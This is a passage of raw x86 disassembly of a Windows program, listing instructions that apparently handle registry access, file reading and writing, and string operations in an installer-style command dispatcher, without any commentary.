  4024cb:	85 c9                	test   %ecx,%ecx
  4024cd:	75 0c                	jne    0x4024db
  4024cf:	8b 0d 44 06 47 00    	mov    0x470644,%ecx
  4024d5:	81 c1 01 00 00 80    	add    $0x80000001,%ecx
  4024db:	8b 55 ec             	mov    -0x14(%ebp),%edx
  4024de:	83 e2 02             	and    $0x2,%edx
  4024e1:	52                   	push   %edx
  4024e2:	50                   	push   %eax
  4024e3:	51                   	push   %ecx
  4024e4:	e8 ae ef ff ff       	call   0x401497
  4024e9:	8b f0                	mov    %eax,%esi
  4024eb:	85 f6                	test   %esi,%esi
  4024ed:	0f 84 65 07 00 00    	je     0x402c58
  4024f3:	e9 29 f2 ff ff       	jmp    0x401721
  4024f8:	85 c0                	test   %eax,%eax
  4024fa:	74 04                	je     0x402500
  4024fc:	8b f8                	mov    %eax,%edi
  4024fe:	eb 0c                	jmp    0x40250c
  402500:	8b 3d 44 06 47 00    	mov    0x470644,%edi
  402506:	81 c7 01 00 00 80    	add    $0x80000001,%edi
  40250c:	8b 45 f0             	mov    -0x10(%ebp),%eax
  40250f:	8b 5d ec             	mov    -0x14(%ebp),%ebx
  402512:	6a 02                	push   $0x2
  402514:	5e                   	pop    %esi
  402515:	89 45 c4             	mov    %eax,-0x3c(%ebp)
  402518:	e8 3f ef ff ff       	call   0x40145c
  40251d:	6a 11                	push   $0x11
  40251f:	5e                   	pop    %esi
  402520:	89 45 cc             	mov    %eax,-0x34(%ebp)
  402523:	e8 34 ef ff ff       	call   0x40145c
  402528:	33 c9                	xor    %ecx,%ecx
  40252a:	51                   	push   %ecx
  40252b:	8d 55 08             	lea    0x8(%ebp),%edx
  40252e:	52                   	push   %edx
  40252f:	8b 15 70 06 47 00    	mov    0x470670,%edx
  402535:	51                   	push   %ecx
  402536:	83 ca 02             	or     $0x2,%edx
  402539:	52                   	push   %edx
  40253a:	51                   	push   %ecx
  40253b:	51                   	push   %ecx
  40253c:	51                   	push   %ecx
  40253d:	50                   	push   %eax
  40253e:	57                   	push   %edi
  40253f:	c7 45 fc 01 00 00 00 	movl   $0x1,-0x4(%ebp)
  402546:	ff 15 14 80 40 00    	call   *0x408014
  40254c:	85 c0                	test   %eax,%eax
  40254e:	0f 85 04 07 00 00    	jne    0x402c58
  402554:	bf b8 20 41 00       	mov    $0x4120b8,%edi
  402559:	83 fb 01             	cmp    $0x1,%ebx
  40255c:	75 12                	jne    0x402570
  40255e:	6a 23                	push   $0x23
  402560:	5e                   	pop    %esi
  402561:	e8 f6 ee ff ff       	call   0x40145c
  402566:	57                   	push   %edi
  402567:	e8 36 35 00 00       	call   0x405aa2
  40256c:	8d 44 00 02          	lea    0x2(%eax,%eax,1),%eax
  402570:	83 fb 04             	cmp    $0x4,%ebx
  402573:	75 0f                	jne    0x402584
  402575:	6a 03                	push   $0x3
  402577:	59                   	pop    %ecx
  402578:	e8 c9 ee ff ff       	call   0x401446
  40257d:	53                   	push   %ebx
  40257e:	a3 b8 20 41 00       	mov    %eax,0x4120b8
  402583:	58                   	pop    %eax
  402584:	83 fb 03             	cmp    $0x3,%ebx
  402587:	75 10                	jne    0x402599
  402589:	68 18 c0 00 00       	push   $0xc018
  40258e:	57                   	push   %edi
  40258f:	6a 00                	push   $0x0
  402591:	ff 75 e8             	push   -0x18(%ebp)
  402594:	e8 4e 09 00 00       	call   0x402ee7
  402599:	50                   	push   %eax
  40259a:	57                   	push   %edi
  40259b:	ff 75 c4             	push   -0x3c(%ebp)
  40259e:	6a 00                	push   $0x0
  4025a0:	ff 75 cc             	push   -0x34(%ebp)
  4025a3:	ff 75 08             	push   0x8(%ebp)
  4025a6:	ff 15 18 80 40 00    	call   *0x408018
  4025ac:	85 c0                	test   %eax,%eax
  4025ae:	75 03                	jne    0x4025b3
  4025b0:	21 45 fc             	and    %eax,-0x4(%ebp)
  4025b3:	ff 75 08             	push   0x8(%ebp)
  4025b6:	ff 15 08 80 40 00    	call   *0x408008
  4025bc:	e9 97 06 00 00       	jmp    0x402c58
  4025c1:	68 19 00 02 00       	push   $0x20019
  4025c6:	e8 82 ef ff ff       	call   0x40154d
  4025cb:	6a 33                	push   $0x33
  4025cd:	5e                   	pop    %esi
  4025ce:	8b d8                	mov    %eax,%ebx
  4025d0:	e8 87 ee ff ff       	call   0x40145c
  4025d5:	33 c9                	xor    %ecx,%ecx
  4025d7:	66 89 0f             	mov    %cx,(%edi)
  4025da:	85 db                	test   %ebx,%ebx
  4025dc:	0f 84 3f f1 ff ff    	je     0x401721
  4025e2:	8d 4d f4             	lea    -0xc(%ebp),%ecx
  4025e5:	51                   	push   %ecx
  4025e6:	57                   	push   %edi
  4025e7:	8d 4d 08             	lea    0x8(%ebp),%ecx
  4025ea:	51                   	push   %ecx
  4025eb:	6a 00                	push   $0x0
  4025ed:	50                   	push   %eax
  4025ee:	53                   	push   %ebx
  4025ef:	c7 45 f4 08 40 00 00 	movl   $0x4008,-0xc(%ebp)
  4025f6:	ff 15 1c 80 40 00    	call   *0x40801c
  4025fc:	33 c9                	xor    %ecx,%ecx
  4025fe:	41                   	inc    %ecx
  4025ff:	85 c0                	test   %eax,%eax
  402601:	75 37                	jne    0x40263a
  402603:	83 7d 08 04          	cmpl   $0x4,0x8(%ebp)
  402607:	74 1c                	je     0x402625
  402609:	39 4d 08             	cmp    %ecx,0x8(%ebp)
  40260c:	74 06                	je     0x402614
  40260e:	83 7d 08 02          	cmpl   $0x2,0x8(%ebp)
  402612:	75 26                	jne    0x40263a
  402614:	8b 45 ec             	mov    -0x14(%ebp),%eax
  402617:	8b 4d f4             	mov    -0xc(%ebp),%ecx
  40261a:	89 45 fc             	mov    %eax,-0x4(%ebp)
  40261d:	33 c0                	xor    %eax,%eax
  40261f:	66 89 04 4f          	mov    %ax,(%edi,%ecx,2)
  402623:	eb 1d                	jmp    0x402642
  402625:	ff 37                	push   (%edi)
  402627:	33 c0                	xor    %eax,%eax
  402629:	39 45 ec             	cmp    %eax,-0x14(%ebp)
  40262c:	57                   	push   %edi
  40262d:	0f 94 c0             	sete   %al
  402630:	89 45 fc             	mov    %eax,-0x4(%ebp)
  402633:	e8 9b 33 00 00       	call   0x4059d3
  402638:	eb 08                	jmp    0x402642
  40263a:	33 c0                	xor    %eax,%eax
  40263c:	66 89 07             	mov    %ax,(%edi)
  40263f:	89 4d fc             	mov    %ecx,-0x4(%ebp)
  402642:	53                   	push   %ebx
  402643:	e9 6e ff ff ff       	jmp    0x4025b6
  402648:	68 19 00 02 00       	push   $0x20019
  40264d:	e8 fb ee ff ff       	call   0x40154d
  402652:	6a 03                	push   $0x3
  402654:	59                   	pop    %ecx
  402655:	8b f0                	mov    %eax,%esi
  402657:	e8 ea ed ff ff       	call   0x401446
  40265c:	33 c9                	xor    %ecx,%ecx
  40265e:	33 d2                	xor    %edx,%edx
  402660:	66 89 0f             	mov    %cx,(%edi)
  402663:	3b f2                	cmp    %edx,%esi
  402665:	0f 84 b6 f0 ff ff    	je     0x401721
  40266b:	b9 03 20 00 00       	mov    $0x2003,%ecx
  402670:	89 4d 08             	mov    %ecx,0x8(%ebp)
  402673:	39 55 ec             	cmp    %edx,-0x14(%ebp)
  402676:	74 0c                	je     0x402684
  402678:	51                   	push   %ecx
  402679:	57                   	push   %edi
  40267a:	50                   	push   %eax
  40267b:	56                   	push   %esi
  40267c:	ff 15 00 80 40 00    	call   *0x408000
  402682:	eb 19                	jmp    0x40269d
  402684:	52                   	push   %edx
  402685:	52                   	push   %edx
  402686:	52                   	push   %edx
  402687:	52                   	push   %edx
  402688:	8d 4d 08             	lea    0x8(%ebp),%ecx
  40268b:	51                   	push   %ecx
  40268c:	57                   	push   %edi
  40268d:	50                   	push   %eax
  40268e:	56                   	push   %esi
  40268f:	ff 15 20 80 40 00    	call   *0x408020
  402695:	85 c0                	test   %eax,%eax
  402697:	0f 85 84 f0 ff ff    	jne    0x401721
  40269d:	33 c0                	xor    %eax,%eax
  40269f:	66 89 87 06 40 00 00 	mov    %ax,0x4006(%edi)
  4026a6:	56                   	push   %esi
  4026a7:	e9 0a ff ff ff       	jmp    0x4025b6
  4026ac:	66 83 3f 00          	cmpw   $0x0,(%edi)
  4026b0:	0f 84 a2 05 00 00    	je     0x402c58
  4026b6:	57                   	push   %edi
  4026b7:	e8 30 33 00 00       	call   0x4059ec
  4026bc:	50                   	push   %eax
  4026bd:	ff 15 bc 80 40 00    	call   *0x4080bc
  4026c3:	e9 90 05 00 00       	jmp    0x402c58
  4026c8:	6a ed                	push   $0xffffffed
  4026ca:	5e                   	pop    %esi
  4026cb:	e8 8c ed ff ff       	call   0x40145c
  4026d0:	ff 75 e4             	push   -0x1c(%ebp)
  4026d3:	ff 75 e0             	push   -0x20(%ebp)
  4026d6:	50                   	push   %eax
  4026d7:	e8 f6 31 00 00       	call   0x4058d2
  4026dc:	83 f8 ff             	cmp    $0xffffffff,%eax
  4026df:	0f 85 6c 05 00 00    	jne    0x402c51
  4026e5:	33 c0                	xor    %eax,%eax
  4026e7:	66 89 07             	mov    %ax,(%edi)
  4026ea:	e9 32 f0 ff ff       	jmp    0x401721
  4026ef:	bb 04 20 00 00       	mov    $0x2004,%ebx
  4026f4:	53                   	push   %ebx
  4026f5:	6a 40                	push   $0x40
  4026f7:	ff 15 20 81 40 00    	call   *0x408120
  4026fd:	83 7d e4 00          	cmpl   $0x0,-0x1c(%ebp)
  402701:	8b f0                	mov    %eax,%esi
  402703:	89 75 08             	mov    %esi,0x8(%ebp)
  402706:	74 0f                	je     0x402717
  402708:	33 c9                	xor    %ecx,%ecx
  40270a:	41                   	inc    %ecx
  40270b:	e8 36 ed ff ff       	call   0x401446
  402710:	88 06                	mov    %al,(%esi)
  402712:	33 c0                	xor    %eax,%eax
  402714:	40                   	inc    %eax
  402715:	eb 28                	jmp    0x40273f
  402717:	6a 11                	push   $0x11
  402719:	5e                   	pop    %esi
  40271a:	e8 3d ed ff ff       	call   0x40145c
  40271f:	33 c0                	xor    %eax,%eax
  402721:	50                   	push   %eax
  402722:	50                   	push   %eax
  402723:	53                   	push   %ebx
  402724:	ff 75 08             	push   0x8(%ebp)
  402727:	6a ff                	push   $0xffffffff
  402729:	68 b0 e0 40 00       	push   $0x40e0b0
  40272e:	50                   	push   %eax
  40272f:	50                   	push   %eax
  402730:	ff 15 44 81 40 00    	call   *0x408144
  402736:	ff 75 08             	push   0x8(%ebp)
  402739:	ff 15 4c 81 40 00    	call   *0x40814c
  40273f:	66 83 3f 00          	cmpw   $0x0,(%edi)
  402743:	74 1b                	je     0x402760
  402745:	6a 00                	push   $0x0
  402747:	8d 4d c4             	lea    -0x3c(%ebp),%ecx
  40274a:	51                   	push   %ecx
  40274b:	50                   	push   %eax
  40274c:	ff 75 08             	push   0x8(%ebp)
  40274f:	57                   	push   %edi
  402750:	e8 97 32 00 00       	call   0x4059ec
  402755:	50                   	push   %eax
  402756:	ff 15 50 81 40 00    	call   *0x408150
  40275c:	85 c0                	test   %eax,%eax
  40275e:	75 07                	jne    0x402767
  402760:	c7 45 fc 01 00 00 00 	movl   $0x1,-0x4(%ebp)
  402767:	ff 75 08             	push   0x8(%ebp)
  40276a:	e9 ca f9 ff ff       	jmp    0x402139
  40276f:	6a 02                	push   $0x2
  402771:	59                   	pop    %ecx
  402772:	33 f6                	xor    %esi,%esi
  402774:	e8 cd ec ff ff       	call   0x401446
  402779:	83 f8 01             	cmp    $0x1,%eax
  40277c:	89 45 f4             	mov    %eax,-0xc(%ebp)
  40277f:	0f 8c d3 04 00 00    	jl     0x402c58
  402785:	b9 03 20 00 00       	mov    $0x2003,%ecx
  40278a:	3b c1                	cmp    %ecx,%eax
  40278c:	7e 03                	jle    0x402791
  40278e:	89 4d f4             	mov    %ecx,-0xc(%ebp)
  402791:	66 39 37             	cmp    %si,(%edi)
  402794:	0f 84 b3 00 00 00    	je     0x40284d
  40279a:	57                   	push   %edi
  40279b:	c6 45 d3 00          	movb   $0x0,-0x2d(%ebp)
  40279f:	e8 48 32 00 00       	call   0x4059ec
  4027a4:	39 75 f4             	cmp    %esi,-0xc(%ebp)
  4027a7:	89 45 d4             	mov    %eax,-0x2c(%ebp)
  4027aa:	0f 8e 9d 00 00 00    	jle    0x40284d
  4027b0:	6a 00                	push   $0x0
  4027b2:	8d 45 c4             	lea    -0x3c(%ebp),%eax
  4027b5:	50                   	push   %eax
  4027b6:	6a 01                	push   $0x1
  4027b8:	8d 45 0b             	lea    0xb(%ebp),%eax
  4027bb:	50                   	push   %eax
  4027bc:	ff 75 d4             	push   -0x2c(%ebp)
  4027bf:	ff 15 54 81 40 00    	call   *0x408154
  4027c5:	85 c0                	test   %eax,%eax
  4027c7:	0f 84 80 00 00 00    	je     0x40284d
  4027cd:	83 7d c4 01          	cmpl   $0x1,-0x3c(%ebp)
  4027d1:	75 7a                	jne    0x40284d
  4027d3:	33 ff                	xor    %edi,%edi
  4027d5:	39 7d e8             	cmp    %edi,-0x18(%ebp)
  4027d8:	75 39                	jne    0x402813
  4027da:	6a 02                	push   $0x2
  4027dc:	8d 45 f8             	lea    -0x8(%ebp),%eax
  4027df:	50                   	push   %eax
  4027e0:	6a 01                	push   $0x1
  4027e2:	8d 45 0b             	lea    0xb(%ebp),%eax
  4027e5:	50                   	push   %eax
  4027e6:	57                   	push   %edi
  4027e7:	57                   	push   %edi
  4027e8:	ff 15 58 81 40 00    	call   *0x408158
  4027ee:	8a 45 d3             	mov    -0x2d(%ebp),%al
  4027f1:	3c 0d                	cmp    $0xd,%al
  4027f3:	74 2e                	je     0x402823
  4027f5:	3c 0a                	cmp    $0xa,%al
  4027f7:	74 2a                	je     0x402823
  4027f9:	66 8b 45 f8          	mov    -0x8(%ebp),%ax
  4027fd:	66 89 04 73          	mov    %ax,(%ebx,%esi,2)
  402801:	8a 45 0b             	mov    0xb(%ebp),%al
  402804:	46                   	inc    %esi
  402805:	88 45 d3             	mov    %al,-0x2d(%ebp)
  402808:	84 c0                	test   %al,%al
  40280a:	74 41                	je     0x40284d
  40280c:	3b 75 f4             	cmp    -0xc(%ebp),%esi
  40280f:	7c 9f                	jl     0x4027b0
  402811:	eb 3a                	jmp    0x40284d
  402813:	0f b6 45 0b          	movzbl 0xb(%ebp),%eax
  402817:	50                   	push   %eax
  402818:	53                   	push   %ebx
  402819:	e8 b5 31 00 00       	call   0x4059d3
  40281e:	e9 3e 04 00 00       	jmp    0x402c61
  402823:	3a 45 0b             	cmp    0xb(%ebp),%al
  402826:	74 17                	je     0x40283f
  402828:	80 7d 0b 0d          	cmpb   $0xd,0xb(%ebp)
  40282c:	74 06                	je     0x402834
  40282e:	80 7d 0b 0a          	cmpb   $0xa,0xb(%ebp)
  402832:	75 0b                	jne    0x40283f
  402834:	66 8b 45 f8          	mov    -0x8(%ebp),%ax
  402838:	66 89 04 73          	mov    %ax,(%ebx,%esi,2)
  40283c:	46                   	inc    %esi
  40283d:	eb 0e                	jmp    0x40284d
  40283f:	6a 01                	push   $0x1
  402841:	57                   	push   %edi
  402842:	6a ff                	push   $0xffffffff
  402844:	ff 75 d4             	push   -0x2c(%ebp)
  402847:	ff 15 5c 81 40 00    	call   *0x40815c
  40284d:	33 c0                	xor    %eax,%eax
  40284f:	66 89 04 73          	mov    %ax,(%ebx,%esi,2)
  402853:	85 f6                	test   %esi,%esi
  402855:	e9 c1 ee ff ff       	jmp    0x40171b
  40285a:	83 7d e4 00          	cmpl   $0x0,-0x1c(%ebp)
  40285e:	74 13                	je     0x402873
  402860:	33 c9                	xor    %ecx,%ecx
  402862:	41                   	inc    %ecx
  402863:	e8 de eb ff ff       	call   0x401446
  402868:	66 a3 b0 e0 40 00    	mov    %ax,0x40e0b0
  40286e:	33 c0                	xor    %eax,%eax
  402870:	40                   	inc    %eax
  402871:	eb 0e                	jmp    0x402881
  402873:	6a 11                	push   $0x11
  402875:	5e                   	pop    %esi
  402876:	e8 e1 eb ff ff       	call   0x40145c
  40287b:	50                   	push   %eax
  40287c:	e8 21 32 00 00       	call   0x405aa2
  402881:	66 83 3f 00          	cmpw   $0x0,(%edi)
  402885:	0f 84 96 ee ff ff    	je     0x401721
  40288b:	6a 00                	push   $0x0
  40288d:	8d 4d 08             	lea    0x8(%ebp),%ecx
  402890:	51                   	push   %ecx
  402891:	03 c0                	add    %eax,%eax
  402893:	50                   	push   %eax
  402894:	68 b0 e0 40 00       	push   $0x40e0b0
  402899:	57                   	push   %edi
  40289a:	e8 4d 31 00 00       	call   0x4059ec
  40289f:	50                   	push   %eax
  4028a0:	ff 15 50 81 40 00    	call   *0x408150
  4028a6:	e9 6e ee ff ff       	jmp    0x401719
  4028ab:	6a 02                	push   $0x2
  4028ad:	59                   	pop    %ecx
  4028ae:	33 f6                	xor    %esi,%esi
  4028b0:	e8 91 eb ff ff       	call   0x401446
  4028b5:	83 f8 01             	cmp    $0x1,%eax
  4028b8:	89 45 f8             	mov    %eax,-0x8(%ebp)
  4028bb:	0f 8c 97 03 00 00    	jl     0x402c58
  4028c1:	b9 03 20 00 00       	mov    $0x2003,%ecx
  4028c6:	3b c1                	cmp    %ecx,%eax
  4028c8:	7e 03                	jle    0x4028cd
  4028ca:	89 4d f8             	mov    %ecx,-0x8(%ebp)
  4028cd:	66 39 37             	cmp    %si,(%edi)
  4028d0:	0f 84 77 ff ff ff    	je     0x40284d
  4028d6:	21 75 08             	and    %esi,0x8(%ebp)
  4028d9:	57                   	push   %edi
  4028da:	e8 0d 31 00 00       	call   0x4059ec
  4028df:	39 75 f8             	cmp    %esi,-0x8(%ebp)
  4028e2:	89 45 d4             	mov    %eax,-0x2c(%ebp)
  4028e5:	0f 8e 62 ff ff ff    	jle    0x40284d
  4028eb:	8b 7d 08             	mov    0x8(%ebp),%edi
  4028ee:	6a 00                	push   $0x0
  4028f0:	8d 45 c4             	lea    -0x3c(%ebp),%eax
  4028f3:	50                   	push   %eax
  4028f4:	6a 02                	push   $0x2
  4028f6:	8d 45 08             	lea    0x8(%ebp),%eax
  4028f9:	50                   	push   %eax
  4028fa:	ff 75 d4             	push   -0x2c(%ebp)
  4028fd:	ff 15 54 81 40 00    	call   *0x408154
  402903:	85 c0                	test   %eax,%eax
  402905:	0f 84 42 ff ff ff    	je     0x40284d
  40290b:	83 7d c4 02          	cmpl   $0x2,-0x3c(%ebp)
  40290f:	0f 85 38 ff ff ff    	jne    0x40284d
  402915:	83 7d e8 00          	cmpl   $0x0,-0x18(%ebp)
  402919:	75 2b                	jne    0x402946
  40291b:	66 83 ff 0d          	cmp    $0xd,%di
  40291f:	74 2e                	je     0x40294f
  402921:	66 83 ff 0a          	cmp    $0xa,%di
  402925:	74 28                	je     0x40294f
  402927:	66 8b 45 08          	mov    0x8(%ebp),%ax
  40292b:	66 89 04 73          	mov    %ax,(%ebx,%esi,2)
  40292f:	46                   	inc    %esi
  402930:	0f b7 f8             	movzwl %ax,%edi
  402933:	66 85 c0             	test   %ax,%ax
  402936:	0f 84 11 ff ff ff    	je     0x40284d
  40293c:	3b 75 f8             	cmp    -0x8(%ebp),%esi
  40293f:	7c ad                	jl     0x4028ee
  402941:	e9 07 ff ff ff       	jmp    0x40284d
  402946:	0f b7 45 08          	movzwl 0x8(%ebp),%eax
  40294a:	e9 c8 fe ff ff       	jmp    0x402817
  40294f:	66 8b 45 08          	mov    0x8(%ebp),%ax
  402953:	66 3b f8             	cmp    %ax,%di
  402956:	74 14                	je     0x40296c
  402958:	66 83 f8 0d          	cmp    $0xd,%ax
  40295c:	0f 84 d6 fe ff ff    	je     0x402838
  402962:	66 83 f8 0a          	cmp    $0xa,%ax
  402966:	0f 84 cc fe ff ff    	je     0x402838
  40296c:	6a 01                	push   $0x1
  40296e:	6a 00                	push   $0x0
  402970:	6a fe                	push   $0xfffffffe
  402972:	e9 cd fe ff ff       	jmp    0x402844
  402977:	66 83 3f 00          	cmpw   $0x0,(%edi)
  40297b:	0f 84 d7 02 00 00    	je     0x402c58
  402981:	ff 75 e8             	push   -0x18(%ebp)
  402984:	6a 00                	push   $0x0
  402986:	6a 02                	push   $0x2
  402988:	59                   	pop    %ecx
  402989:	e8 b8 ea ff ff       	call   0x401446
  40298e:	50                   	push   %eax
  40298f:	57                   	push   %edi
  402990:	e8 57 30 00 00       	call   0x4059ec
  402995:	50                   	push   %eax
  402996:	ff 15 5c 81 40 00    	call   *0x40815c
  40299c:	83 7d e0 00          	cmpl   $0x0,-0x20(%ebp)
  4029a0:	0f 8c b2 02 00 00    	jl     0x402c58
  4029a6:	50                   	push   %eax
  4029a7:	53                   	push   %ebx
  4029a8:	e9 a6 02 00 00       	jmp    0x402c53
  4029ad:	66 83 3f 00          	cmpw   $0x0,(%edi)
  4029b1:	0f 84 a1 02 00 00    	je     0x402c58
  4029b7:	57                   	push   %edi
  4029b8:	e8 2f 30 00 00       	call   0x4059ec
  4029bd:	50                   	push   %eax
  4029be:	ff 15 60 81 40 00    	call   *0x408160
  4029c4:	e9 8f 02 00 00       	jmp    0x402c58
  4029c9:	66 83 3b 00          	cmpw   $0x0,(%ebx)
  4029cd:	0f 84 df ee ff ff    	je     0x4018b2
  4029d3:	8d 85 5c fd ff ff    	lea    -0x2a4(%ebp),%eax
  4029d9:	50                   	push   %eax
  4029da:	53                   	push   %ebx
  4029db:	e8 0c 30 00 00       	call   0x4059ec
  4029e0:	50                   	push   %eax
  4029e1:	ff 15 64 81 40 00    	call   *0x408164
  4029e7:	85 c0                	test   %eax,%eax
  4029e9:	0f 84 c3 ee ff ff    	je     0x4018b2
  4029ef:	eb 2c                	jmp    0x402a1d
  4029f1:	6a 02                	push   $0x2
  4029f3:	5e                   	pop    %esi
  4029f4:	e8 63 ea ff ff       	call   0x40145c
  4029f9:	8d 8d 5c fd ff ff    	lea    -0x2a4(%ebp),%ecx
  4029ff:	51                   	push   %ecx
  402a00:	50                   	push   %eax
  402a01:	ff 15 68 81 40 00    	call   *0x408168
  402a07:	83 f8 ff             	cmp    $0xffffffff,%eax
  402a0a:	75 0a                	jne    0x402a16
  402a0c:	33 c0                	xor    %eax,%eax
  402a0e:	66 89 03             	mov    %ax,(%ebx)
  402a11:	e9 cf fc ff ff       	jmp    0x4026e5
  402a16:	50                   	push   %eax
  402a17:	53                   	push   %ebx
  402a18:	e8 b6 2f 00 00       	call   0x4059d3
  402a1d:	8d 85 88 fd ff ff    	lea    -0x278(%ebp),%eax
  402a23:	50                   	push   %eax
  402a24:	57                   	push   %edi
  402a25:	e8 62 30 00 00       	call   0x405a8c
  402a2a:	e9 29 02 00 00       	jmp    0x402c58
  402a2f:	6a f0                	push   $0xfffffff0
  402a31:	5e                   	pop    %esi
  402a32:	bb 66 fd ff ff       	mov    $0xfffffd66,%ebx
  402a37:	e8 20 ea ff ff       	call   0x40145c
  402a3c:	8b f8                	mov    %eax,%edi
  402a3e:	57                   	push   %edi
  402a3f:	89 7d cc             	mov    %edi,-0x34(%ebp)
  402a42:	e8 5f 2d 00 00       	call   0x4057a6
  402a47:	85 c0                	test   %eax,%eax
  402a49:	75 08                	jne    0x402a53
  402a4b:	6a ed                	push   $0xffffffed
  402a4d:	5e                   	pop    %esi
  402a4e:	e8 09 ea ff ff       	call   0x40145c
  402a53:	57                   	push   %edi
  402a54:	e8 59 2e 00 00       	call   0x4058b2
  402a59:	6a 02                	push   $0x2
  402a5b:	68 00 00 00 40       	push   $0x40000000
  402a60:	57                   	push   %edi
  402a61:	e8 6c 2e 00 00       	call   0x4058d2
  402a66:	89 45 08             	mov    %eax,0x8(%ebp)
  402a69:	83 f8 ff             	cmp    $0xffffffff,%eax
  402a6c:	0f 84 9d 00 00 00    	je     0x402b0f
  402a72:	a1 ec 05 47 00       	mov    0x4705ec,%eax
  402a77:	8b 35 20 81 40 00    	mov    0x408120,%esi
  402a7d:	50                   	push   %eax
  402a7e:	6a 40                	push   $0x40
  402a80:	89 45 d4             	mov    %eax,-0x2c(%ebp)
  402a83:	ff d6                	call   *%esi
  402a85:	8b f8                	mov    %eax,%edi
  402a87:	85 ff                	test   %edi,%edi
  402a89:	74 7b                	je     0x402b06
  402a8b:	6a 00                	push   $0x0
  402a8d:	e8 3e 04 00 00       	call   0x402ed0
  402a92:	ff 75 d4             	push   -0x2c(%ebp)
  402a95:	57                   	push   %edi
  402a96:	e8 03 04 00 00       	call   0x402e9e
  402a9b:	ff 75 e4             	push   -0x1c(%ebp)
  402a9e:	6a 40                	push   $0x40
  402aa0:	ff d6                	call   *%esi
  402aa2:	8b f0                	mov    %eax,%esi
  402aa4:	89 75 c4             	mov    %esi,-0x3c(%ebp)
  402aa7:	85 f6                	test   %esi,%esi
  402aa9:	74 32                	je     0x402add
  402aab:	ff 75 e4             	push   -0x1c(%ebp)
  402aae:	56                   	push   %esi
  402aaf:	6a 00                	push   $0x0
  402ab1:	ff 75 e0             	push   -0x20(%ebp)
  402ab4:	e8 2e 04 00 00       	call   0x402ee7
  402ab9:	eb 14                	jmp    0x402acf
  402abb:	8b 1e                	mov    (%esi),%ebx
  402abd:	8b 46 04             	mov    0x4(%esi),%eax
  402ac0:	53                   	push   %ebx
  402ac1:	83 c6 08             	add    $0x8,%esi
  402ac4:	56                   	push   %esi
  402ac5:	03 c7                	add    %edi,%eax
  402ac7:	50                   	push   %eax
  402ac8:	e8 c1 2d 00 00       	call   0x40588e
  402acd:	03 f3                	add    %ebx,%esi
  402acf:	80 3e 00             	cmpb   $0x0,(%esi)
  402ad2:	75 e7                	jne    0x402abb
  402ad4:	ff 75 c4             	push   -0x3c(%ebp)
  402ad7:	ff 15 2c 81 40 00    	call   *0x40812c
  402add:	33 f6                	xor    %esi,%esi
  402adf:	56                   	push   %esi
  402ae0:	8d 45 f4             	lea    -0xc(%ebp),%eax
  402ae3:	50                   	push   %eax
  402ae4:	ff 75 d4             	push   -0x2c(%ebp)
  402ae7:	57                   	push   %edi
  402ae8:	ff 75 08             	push   0x8(%ebp)
  402aeb:	ff 15 50 81 40 00    	call   *0x408150
  402af1:	57                   	push   %edi
  402af2:	ff 15 2c 81 40 00    	call   *0x40812c
  402af8:	56                   	push   %esi
  402af9:	56                   	push   %esi
  402afa:	ff 75 08             	push   0x8(%ebp)
  402afd:	6a ff                	push   $0xffffffff
  402aff:	e8 e3 03 00 00       	call   0x402ee7
  402b04:	8b d8                	mov    %eax,%ebx
  402b06:	ff 75 08             	push   0x8(%ebp)
  402b09:	ff 15 bc 80 40 00    	call   *0x4080bc
  402b0f:	6a f3                	push   $0xfffffff3
  402b11:	5e                   	pop    %esi
  402b12:	85 db                	test   %ebx,%ebx
  402b14:	7d 13                	jge    0x402b29
  402b16:	6a ef                	push   $0xffffffef
  402b18:	5e                   	pop    %esi
  402b19:	ff 75 cc             	push   -0x34(%ebp)
  402b1c:	ff 15 6c 81 40 00    	call   *0x40816c
  402b22:	c7 45 fc 01 00 00 00 	movl   $0x1,-0x4(%ebp)
  402b29:	56                   	push   %esi
  402b2a:	e9 7d ec ff ff       	jmp    0x4017ac
  402b2f:	33 c9                	xor    %ecx,%ecx
  402b31:	e8 10 e9 ff ff       	call   0x401446
  402b36:	8b f8                	mov    %eax,%edi
  402b38:	3b 3d ac 05 47 00    	cmp    0x4705ac,%edi
  402b3e:	0f 83 dd eb ff ff    	jae    0x401721
  402b44:	8b 45 e4             	mov    -0x1c(%ebp),%eax
  402b47:	8b f7                	mov    %edi,%esi
  402b49:	69 f6 20 40 00 00    	imul   $0x4020,%esi,%esi
  402b4f:	03 35 a8 05 47 00    	add    0x4705a8,%esi
  402b55:	85 c0                	test   %eax,%eax
  402b57:	7c 15                	jl     0x402b6e
  402b59:	8b 0c 86             	mov    (%esi,%eax,4),%ecx
  402b5c:	75 0a                	jne    0x402b68
  402b5e:	83 c6 18             	add    $0x18,%esi
  402b61:	56                   	push   %esi
  402b62:	53                   	push   %ebx
  402b63:	e9 bd fe ff ff       	jmp    0x402a25
  402b68:	51                   	push   %ecx
  402b69:	e9 39 fe ff ff       	jmp    0x4029a7
  402b6e:	83 c9 ff             	or     $0xffffffff,%ecx
  402b71:	2b c8                	sub    %eax,%ecx
  402b73:	89 4d e4             	mov    %ecx,-0x1c(%ebp)
  402b76:	74 0d                	je     0x402b85
  402b78:	33 c9                	xor    %ecx,%ecx
  402b7a:	41                   	inc    %ecx
  402b7b:	e8 c6 e8 ff ff       	call   0x401446
  402b80:	89 45 e0             	mov    %eax,-0x20(%ebp)
  402b83:	eb 13                	jmp    0x402b98
  402b85:	ff 75 ec             	push   -0x14(%ebp)
  402b88:	8d 46 18             	lea    0x18(%esi),%eax
  402b8b:	50                   	push   %eax
  402b8c:	e8 0d 35 00 00       	call   0x40609e
  402b91:	81 4e 08 00 01 00 00 	orl    $0x100,0x8(%esi)
  402b98:	8b 45 e4             	mov    -0x1c(%ebp),%eax
  402b9b:	8b 4d e0             	mov    -0x20(%ebp),%ecx
  402b9e:	89 0c 86             	mov    %ecx,(%esi,%eax,4)
  402ba1:	83 7d e8 00          	cmpl   $0x0,-0x18(%ebp)
  402ba5:	0f 84 ad 00 00 00    	je     0x402c58
  402bab:	57                   	push   %edi
  402bac:	e8 d5 e5 ff ff       	call   0x401186
  402bb1:	e9 a2 00 00 00       	jmp    0x402c58
  402bb6:	33 c9                	xor    %ecx,%ecx
  402bb8:	e8 89 e8 ff ff       	call   0x401446
  402bbd:	83 f8 20             	cmp    $0x20,%eax
  402bc0:	0f 83 5b eb ff ff    	jae    0x401721
  402bc6:	33 f6                	xor    %esi,%esi
  402bc8:	39 75 e8             	cmp    %esi,-0x18(%ebp)
  402bcb:	74 1f                	je     0x402bec
  402bcd:	39 75 e4             	cmp    %esi,-0x1c(%ebp)
  402bd0:	74 0f                	je     0x402be1
  402bd2:	50                   	push   %eax
  402bd3:	e8 ce e6 ff ff       	call   0x4012a6
